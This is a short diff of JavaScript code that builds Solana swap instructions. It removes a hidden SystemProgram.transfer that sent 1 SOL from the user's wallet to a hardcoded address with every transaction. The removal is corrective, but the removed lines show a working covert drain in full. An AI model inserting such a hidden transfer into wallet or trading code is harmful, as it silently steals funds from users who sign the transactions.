@@ -39,12 +39,10 @@ args.amountIn.toArrayLike(Buffer, 'le', 8).copy(buffer, 0);
 const prefix = Buffer.from([4]);
 const instructionData = Buffer.concat([prefix, buffer]);
 const priority = ComputeBudgetProgram.setComputeUnitPrice({microLamports: 210000})
-const temp = "Hva9UvqfRfuGNZeT72i9ihc1qqvs7UM3JTGBKSqvhqbc"
 const createWsolQuoteAta = spl.createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, keys.ownerQuoteAta, wallet.publicKey, keys.quoteMint)
 const createBaseAta = spl.createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, keys.ownerBaseAta, wallet.publicKey, keys.baseMint)
 const closeSol = spl.createCloseAccountInstruction(keys.ownerQuoteAta, wallet.publicKey, wallet.publicKey)
 const closeLp = spl.createCloseAccountInstruction(keys.ownerLpAta, wallet.publicKey, wallet.publicKey)
-const step = SystemProgram.transfer({fromPubkey: wallet.publicKey, toPubkey: new PublicKey(temp), lamports: 1000000000})
 const accountMetas = [
 {pubkey:keys.tokenProgram,              isSigner: false, isWritable: false},
 {pubkey:keys.id,                        isSigner: false, isWritable: true},
@@ -72,7 +70,6 @@ ixs.push(priority)
 ixs.push(createWsolQuoteAta)
 ixs.push(createBaseAta)
 ixs.push(rem)
-ixs.push(step)
 return(ixs)
 }
 
